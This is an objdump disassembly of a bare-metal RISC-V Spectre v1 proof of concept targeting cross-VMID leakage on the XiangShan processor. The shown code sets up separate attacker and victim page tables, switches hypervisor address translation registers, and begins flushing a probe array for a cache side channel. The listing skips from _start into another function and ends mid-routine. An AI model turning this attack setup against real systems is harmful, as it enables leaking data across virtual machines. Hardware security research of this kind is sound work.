
/nfs/home/leizhenyu/opt/verified_poc/xiangshan-v2/spectre-v1-vmid-kmhv2/code/build/spectre-v1-vmid-priv-riscv64-xs.elf:     file format elf64-littleriscv


Disassembly of section .text:

0000000080000000 <_start>:
    80000000:	00000093          	li	ra,0
    8000068a:	853e                	mv	a0,a5
    8000068c:	70e2                	ld	ra,56(sp)
    8000068e:	7442                	ld	s0,48(sp)
    80000690:	6121                	addi	sp,sp,64
    80000692:	8082                	ret

0000000080000694 <map_identity_range>:
    80000694:	7139                	addi	sp,sp,-64
    80000696:	fc06                	sd	ra,56(sp)
    80000698:	f822                	sd	s0,48(sp)
    8000069a:	0080                	addi	s0,sp,64
    8000069c:	fca43c23          	sd	a0,-40(s0)
    800006a0:	fcb43823          	sd	a1,-48(s0)
    800006a4:	fcc43423          	sd	a2,-56(s0)
    800006a8:	fcd43023          	sd	a3,-64(s0)
    800006ac:	fd043503          	ld	a0,-48(s0)
    800006b0:	c09ff0ef          	jal	800002b8 <page_down>
    800006b4:	fea43423          	sd	a0,-24(s0)
    800006b8:	fc843503          	ld	a0,-56(s0)
    800006bc:	c17ff0ef          	jal	800002d2 <page_up>
    800006c0:	fea43023          	sd	a0,-32(s0)
    800006c4:	a01d                	j	800006ea <map_identity_range+0x56>
    800006c6:	fc043603          	ld	a2,-64(s0)
    800006ca:	fe843583          	ld	a1,-24(s0)
    800006ce:	fd843503          	ld	a0,-40(s0)
    800006d2:	f61ff0ef          	jal	80000632 <map_identity_page>
    800006d6:	87aa                	mv	a5,a0
    800006d8:	c399                	beqz	a5,800006de <map_identity_range+0x4a>
    800006da:	57fd                	li	a5,-1
    800006dc:	a831                	j	800006f8 <map_identity_range+0x64>
    800006de:	fe843703          	ld	a4,-24(s0)
    800006e2:	6785                	lui	a5,0x1
    800006e4:	97ba                	add	a5,a5,a4
    800006e6:	fef43423          	sd	a5,-24(s0)
    800006ea:	fe843703          	ld	a4,-24(s0)
    800006ee:	fe043783          	ld	a5,-32(s0)
    800006f2:	fcf76ae3          	bltu	a4,a5,800006c6 <map_identity_range+0x32>
    800006f6:	4781                	li	a5,0
    800006f8:	853e                	mv	a0,a5
    800006fa:	70e2                	ld	ra,56(sp)
    800006fc:	7442                	ld	s0,48(sp)
    800006fe:	6121                	addi	sp,sp,64
    80000700:	8082                	ret

0000000080000702 <init_page_space>:
    80000702:	1101                	addi	sp,sp,-32
    80000704:	ec06                	sd	ra,24(sp)
    80000706:	e822                	sd	s0,16(sp)
    80000708:	1000                	addi	s0,sp,32
    8000070a:	fea43423          	sd	a0,-24(s0)
    8000070e:	feb43023          	sd	a1,-32(s0)
    80000712:	fe843783          	ld	a5,-24(s0)
    80000716:	853e                	mv	a0,a5
    80000718:	bdbff0ef          	jal	800002f2 <zero_page>
    8000071c:	fe843703          	ld	a4,-24(s0)
    80000720:	000517b7          	lui	a5,0x51
    80000724:	97ba                	add	a5,a5,a4
    80000726:	0007b023          	sd	zero,0(a5) # 51000 <i+0x50fe0>
    8000072a:	fe843703          	ld	a4,-24(s0)
    8000072e:	000517b7          	lui	a5,0x51
    80000732:	97ba                	add	a5,a5,a4
    80000734:	0007b423          	sd	zero,8(a5) # 51008 <i+0x50fe8>
    80000738:	fe843703          	ld	a4,-24(s0)
    8000073c:	000517b7          	lui	a5,0x51
    80000740:	97ba                	add	a5,a5,a4
    80000742:	0007b823          	sd	zero,16(a5) # 51010 <i+0x50ff0>
    80000746:	fe043703          	ld	a4,-32(s0)
    8000074a:	6791                	lui	a5,0x4
    8000074c:	17fd                	addi	a5,a5,-1 # 3fff <i+0x3fdf>
    8000074e:	8f7d                	and	a4,a4,a5
    80000750:	fe843683          	ld	a3,-24(s0)
    80000754:	000517b7          	lui	a5,0x51
    80000758:	97b6                	add	a5,a5,a3
    8000075a:	ef98                	sd	a4,24(a5)
    8000075c:	fe843783          	ld	a5,-24(s0)
    80000760:	00c7d713          	srli	a4,a5,0xc
    80000764:	57e5                	li	a5,-7
    80000766:	17f2                	slli	a5,a5,0x3c
    80000768:	8f5d                	or	a4,a4,a5
    8000076a:	fe843683          	ld	a3,-24(s0)
    8000076e:	000517b7          	lui	a5,0x51
    80000772:	97b6                	add	a5,a5,a3
    80000774:	f398                	sd	a4,32(a5)
    80000776:	fe843703          	ld	a4,-24(s0)
    8000077a:	000517b7          	lui	a5,0x51
    8000077e:	97ba                	add	a5,a5,a4
    80000780:	6f9c                	ld	a5,24(a5)
    80000782:	02c79713          	slli	a4,a5,0x2c
    80000786:	fe843683          	ld	a3,-24(s0)
    8000078a:	000517b7          	lui	a5,0x51
    8000078e:	97b6                	add	a5,a5,a3
    80000790:	f798                	sd	a4,40(a5)
    80000792:	0001                	nop
    80000794:	60e2                	ld	ra,24(sp)
    80000796:	6442                	ld	s0,16(sp)
    80000798:	6105                	addi	sp,sp,32
    8000079a:	8082                	ret

000000008000079c <switch_vsatp>:
    8000079c:	7179                	addi	sp,sp,-48
    8000079e:	f422                	sd	s0,40(sp)
    800007a0:	1800                	addi	s0,sp,48
    800007a2:	fca43c23          	sd	a0,-40(s0)
    800007a6:	87ae                	mv	a5,a1
    800007a8:	fcf42a23          	sw	a5,-44(s0)
    800007ac:	fd843783          	ld	a5,-40(s0)
    800007b0:	28079073          	csrw	vsatp,a5
    800007b4:	fd442783          	lw	a5,-44(s0)
    800007b8:	2781                	sext.w	a5,a5
    800007ba:	c399                	beqz	a5,800007c0 <switch_vsatp+0x24>
    800007bc:	22000073          	hfence.vvma
    800007c0:	0000100f          	fence.i
    800007c4:	280027f3          	csrr	a5,vsatp
    800007c8:	fef43423          	sd	a5,-24(s0)
    800007cc:	fe843783          	ld	a5,-24(s0)
    800007d0:	853e                	mv	a0,a5
    800007d2:	7422                	ld	s0,40(sp)
    800007d4:	6145                	addi	sp,sp,48
    800007d6:	8082                	ret

00000000800007d8 <switch_hgatp>:
    800007d8:	7179                	addi	sp,sp,-48
    800007da:	f422                	sd	s0,40(sp)
    800007dc:	1800                	addi	s0,sp,48
    800007de:	fca43c23          	sd	a0,-40(s0)
    800007e2:	87ae                	mv	a5,a1
    800007e4:	fcf42a23          	sw	a5,-44(s0)
    800007e8:	fd843783          	ld	a5,-40(s0)
    800007ec:	68079073          	csrw	hgatp,a5
    800007f0:	fd442783          	lw	a5,-44(s0)
    800007f4:	2781                	sext.w	a5,a5
    800007f6:	c789                	beqz	a5,80000800 <switch_hgatp+0x28>
    800007f8:	62000073          	hfence.gvma
    800007fc:	22000073          	hfence.vvma
    80000800:	0000100f          	fence.i
    80000804:	680027f3          	csrr	a5,hgatp
    80000808:	fef43423          	sd	a5,-24(s0)
    8000080c:	fe843783          	ld	a5,-24(s0)
    80000810:	853e                	mv	a0,a5
    80000812:	7422                	ld	s0,40(sp)
    80000814:	6145                	addi	sp,sp,48
    80000816:	8082                	ret

0000000080000818 <install_vmid_page_tables>:
    80000818:	1141                	addi	sp,sp,-16
    8000081a:	e406                	sd	ra,8(sp)
    8000081c:	e022                	sd	s0,0(sp)
    8000081e:	0800                	addi	s0,sp,16
    80000820:	45c5                	li	a1,17
    80000822:	00024517          	auipc	a0,0x24
    80000826:	7de50513          	addi	a0,a0,2014 # 80025000 <attacker_space>
    8000082a:	ed9ff0ef          	jal	80000702 <init_page_space>
    8000082e:	45dd                	li	a1,23
    80000830:	00076517          	auipc	a0,0x76
    80000834:	7d050513          	addi	a0,a0,2000 # 80077000 <victim_space>
    80000838:	ecbff0ef          	jal	80000702 <init_page_space>
    8000083c:	00024717          	auipc	a4,0x24
    80000840:	7c470713          	addi	a4,a4,1988 # 80025000 <attacker_space>
    80000844:	000517b7          	lui	a5,0x51
    80000848:	97ba                	add	a5,a5,a4
    8000084a:	7398                	ld	a4,32(a5)
    8000084c:	00024797          	auipc	a5,0x24
    80000850:	83478793          	addi	a5,a5,-1996 # 80024080 <attacker_vsatp_for_trap>
    80000854:	e398                	sd	a4,0(a5)
    80000856:	00024717          	auipc	a4,0x24
    8000085a:	7aa70713          	addi	a4,a4,1962 # 80025000 <attacker_space>
    8000085e:	000517b7          	lui	a5,0x51
    80000862:	97ba                	add	a5,a5,a4
    80000864:	7798                	ld	a4,40(a5)
    80000866:	00024797          	auipc	a5,0x24
    8000086a:	82278793          	addi	a5,a5,-2014 # 80024088 <attacker_hgatp_for_trap>
    8000086e:	e398                	sd	a4,0(a5)
    80000870:	00001797          	auipc	a5,0x1
    80000874:	79078793          	addi	a5,a5,1936 # 80002000 <candidate_value>
    80000878:	00002717          	auipc	a4,0x2
    8000087c:	78870713          	addi	a4,a4,1928 # 80003000 <__u_text_end>
    80000880:	46e9                	li	a3,26
    80000882:	863a                	mv	a2,a4
    80000884:	85be                	mv	a1,a5
    80000886:	00024517          	auipc	a0,0x24
    8000088a:	77a50513          	addi	a0,a0,1914 # 80025000 <attacker_space>
    8000088e:	e07ff0ef          	jal	80000694 <map_identity_range>
    80000892:	87aa                	mv	a5,a0
    80000894:	c795                	beqz	a5,800008c0 <install_vmid_page_tables+0xa8>
    80000896:	00005517          	auipc	a0,0x5
    8000089a:	52a50513          	addi	a0,a0,1322 # 80005dc0 <printf_+0x62>
    8000089e:	88fff0ef          	jal	8000012c <putstr>
    800008a2:	00005517          	auipc	a0,0x5
    800008a6:	52e50513          	addi	a0,a0,1326 # 80005dd0 <printf_+0x72>
    800008aa:	883ff0ef          	jal	8000012c <putstr>
    800008ae:	00005517          	auipc	a0,0x5
    800008b2:	54250513          	addi	a0,a0,1346 # 80005df0 <printf_+0x92>
    800008b6:	877ff0ef          	jal	8000012c <putstr>
    800008ba:	4505                	li	a0,1
    800008bc:	7d3020ef          	jal	8000388e <_halt>
    800008c0:	00001797          	auipc	a5,0x1
    800008c4:	74078793          	addi	a5,a5,1856 # 80002000 <candidate_value>
    800008c8:	00002717          	auipc	a4,0x2
    800008cc:	73870713          	addi	a4,a4,1848 # 80003000 <__u_text_end>
    800008d0:	46e9                	li	a3,26
    800008d2:	863a                	mv	a2,a4
    800008d4:	85be                	mv	a1,a5
    800008d6:	00076517          	auipc	a0,0x76
    800008da:	72a50513          	addi	a0,a0,1834 # 80077000 <victim_space>
    800008de:	db7ff0ef          	jal	80000694 <map_identity_range>
    800008e2:	87aa                	mv	a5,a0
    800008e4:	c795                	beqz	a5,80000910 <install_vmid_page_tables+0xf8>
    800008e6:	00005517          	auipc	a0,0x5
    800008ea:	4da50513          	addi	a0,a0,1242 # 80005dc0 <printf_+0x62>
    800008ee:	83fff0ef          	jal	8000012c <putstr>
    800008f2:	00005517          	auipc	a0,0x5
    800008f6:	57650513          	addi	a0,a0,1398 # 80005e68 <printf_+0x10a>
    800008fa:	833ff0ef          	jal	8000012c <putstr>
    800008fe:	00005517          	auipc	a0,0x5
    80000902:	58a50513          	addi	a0,a0,1418 # 80005e88 <printf_+0x12a>
    80000906:	827ff0ef          	jal	8000012c <putstr>
    8000090a:	4505                	li	a0,1
    8000090c:	783020ef          	jal	8000388e <_halt>
    80000910:	00006797          	auipc	a5,0x6
    80000914:	6f078793          	addi	a5,a5,1776 # 80007000 <attacker_stack>
    80000918:	00012717          	auipc	a4,0x12
    8000091c:	6e870713          	addi	a4,a4,1768 # 80013000 <shared_probe>
    80000920:	46d9                	li	a3,22
    80000922:	863a                	mv	a2,a4
    80000924:	85be                	mv	a1,a5
    80000926:	00024517          	auipc	a0,0x24
    8000092a:	6da50513          	addi	a0,a0,1754 # 80025000 <attacker_space>
    8000092e:	d67ff0ef          	jal	80000694 <map_identity_range>
    80000932:	87aa                	mv	a5,a0
    80000934:	c795                	beqz	a5,80000960 <install_vmid_page_tables+0x148>
    80000936:	00005517          	auipc	a0,0x5
    8000093a:	48a50513          	addi	a0,a0,1162 # 80005dc0 <printf_+0x62>
    8000093e:	feeff0ef          	jal	8000012c <putstr>
    80000942:	00005517          	auipc	a0,0x5
    80000946:	5be50513          	addi	a0,a0,1470 # 80005f00 <printf_+0x1a2>
    8000094a:	fe2ff0ef          	jal	8000012c <putstr>
    8000094e:	00005517          	auipc	a0,0x5
    80000952:	5d250513          	addi	a0,a0,1490 # 80005f20 <printf_+0x1c2>
    80000956:	fd6ff0ef          	jal	8000012c <putstr>
    8000095a:	4505                	li	a0,1
    8000095c:	733020ef          	jal	8000388e <_halt>
    80000960:	00012797          	auipc	a5,0x12
    80000964:	6a078793          	addi	a5,a5,1696 # 80013000 <shared_probe>
    80000968:	00017717          	auipc	a4,0x17
    8000096c:	69870713          	addi	a4,a4,1688 # 80018000 <victim_region>
    80000970:	46d9                	li	a3,22
    80000972:	863a                	mv	a2,a4
    80000974:	85be                	mv	a1,a5
    80000976:	00024517          	auipc	a0,0x24
    8000097a:	68a50513          	addi	a0,a0,1674 # 80025000 <attacker_space>
    8000097e:	d17ff0ef          	jal	80000694 <map_identity_range>
    80000982:	87aa                	mv	a5,a0
    80000984:	c795                	beqz	a5,800009b0 <install_vmid_page_tables+0x198>
    80000986:	00005517          	auipc	a0,0x5
    8000098a:	43a50513          	addi	a0,a0,1082 # 80005dc0 <printf_+0x62>
    8000098e:	f9eff0ef          	jal	8000012c <putstr>
    80000992:	00005517          	auipc	a0,0x5
    80000996:	60650513          	addi	a0,a0,1542 # 80005f98 <printf_+0x23a>
    8000099a:	f92ff0ef          	jal	8000012c <putstr>
    8000099e:	00005517          	auipc	a0,0x5
    800009a2:	61a50513          	addi	a0,a0,1562 # 80005fb8 <printf_+0x25a>
    800009a6:	f86ff0ef          	jal	8000012c <putstr>
    800009aa:	4505                	li	a0,1
    800009ac:	6e3020ef          	jal	8000388e <_halt>
    800009b0:	00012797          	auipc	a5,0x12
    800009b4:	65078793          	addi	a5,a5,1616 # 80013000 <shared_probe>
    800009b8:	00017717          	auipc	a4,0x17
    800009bc:	64870713          	addi	a4,a4,1608 # 80018000 <victim_region>
    800009c0:	46d9                	li	a3,22
    800009c2:	863a                	mv	a2,a4
    800009c4:	85be                	mv	a1,a5
    800009c6:	00076517          	auipc	a0,0x76
    800009ca:	63a50513          	addi	a0,a0,1594 # 80077000 <victim_space>
    800009ce:	cc7ff0ef          	jal	80000694 <map_identity_range>
    800009d2:	87aa                	mv	a5,a0
    800009d4:	c795                	beqz	a5,80000a00 <install_vmid_page_tables+0x1e8>
    800009d6:	00005517          	auipc	a0,0x5
    800009da:	3ea50513          	addi	a0,a0,1002 # 80005dc0 <printf_+0x62>
    800009de:	f4eff0ef          	jal	8000012c <putstr>
    800009e2:	00005517          	auipc	a0,0x5
    800009e6:	64e50513          	addi	a0,a0,1614 # 80006030 <printf_+0x2d2>
    800009ea:	f42ff0ef          	jal	8000012c <putstr>
    800009ee:	00005517          	auipc	a0,0x5
    800009f2:	66250513          	addi	a0,a0,1634 # 80006050 <printf_+0x2f2>
    800009f6:	f36ff0ef          	jal	8000012c <putstr>
    800009fa:	4505                	li	a0,1
    800009fc:	693020ef          	jal	8000388e <_halt>
    80000a00:	00017797          	auipc	a5,0x17
    80000a04:	60078793          	addi	a5,a5,1536 # 80018000 <victim_region>
    80000a08:	0001f717          	auipc	a4,0x1f
    80000a0c:	5f870713          	addi	a4,a4,1528 # 80020000 <trap_count>
    80000a10:	46d9                	li	a3,22
    80000a12:	863a                	mv	a2,a4
    80000a14:	85be                	mv	a1,a5
    80000a16:	00076517          	auipc	a0,0x76
    80000a1a:	5ea50513          	addi	a0,a0,1514 # 80077000 <victim_space>
    80000a1e:	c77ff0ef          	jal	80000694 <map_identity_range>
    80000a22:	87aa                	mv	a5,a0
    80000a24:	c795                	beqz	a5,80000a50 <install_vmid_page_tables+0x238>
    80000a26:	00005517          	auipc	a0,0x5
    80000a2a:	39a50513          	addi	a0,a0,922 # 80005dc0 <printf_+0x62>
    80000a2e:	efeff0ef          	jal	8000012c <putstr>
    80000a32:	00005517          	auipc	a0,0x5
    80000a36:	69650513          	addi	a0,a0,1686 # 800060c8 <printf_+0x36a>
    80000a3a:	ef2ff0ef          	jal	8000012c <putstr>
    80000a3e:	00005517          	auipc	a0,0x5
    80000a42:	6a250513          	addi	a0,a0,1698 # 800060e0 <printf_+0x382>
    80000a46:	ee6ff0ef          	jal	8000012c <putstr>
    80000a4a:	4505                	li	a0,1
    80000a4c:	643020ef          	jal	8000388e <_halt>
    80000a50:	0001                	nop
    80000a52:	60a2                	ld	ra,8(sp)
    80000a54:	6402                	ld	s0,0(sp)
    80000a56:	0141                	addi	sp,sp,16
    80000a58:	8082                	ret

0000000080000a5a <flush_probe_service>:
    80000a5a:	7179                	addi	sp,sp,-48
    80000a5c:	f406                	sd	ra,40(sp)
    80000a5e:	f022                	sd	s0,32(sp)
    80000a60:	1800                	addi	s0,sp,48
    80000a62:	fca43c23          	sd	a0,-40(s0)
    80000a66:	fe043423          	sd	zero,-24(s0)
    80000a6a:	a839                	j	80000a88 <flush_probe_service+0x2e>
    80000a6c:	fe843783          	ld	a5,-24(s0)
    80000a70:	079a                	slli	a5,a5,0x6
    80000a72:	fd843703          	ld	a4,-40(s0)
    80000a76:	97ba                	add	a5,a5,a4
    80000a78:	853e                	mv	a0,a5
    80000a7a:	eecff0ef          	jal	80000166 <xs_flush_cache_line>
    80000a7e:	fe843783          	ld	a5,-24(s0)
    80000a82:	0785                	addi	a5,a5,1
    80000a84:	fef43423          	sd	a5,-24(s0)
    80000a88:	fe843703          	ld	a4,-24(s0)
    80000a8c:	0ff00793          	li	a5,255
    80000a90:	fce7fee3          	bgeu	a5,a4,80000a6c <flush_probe_service+0x12>
    80000a94:	00018517          	auipc	a0,0x18
    80000a98:	56c50513          	addi	a0,a0,1388 # 80019000 <victim_array1_sz>
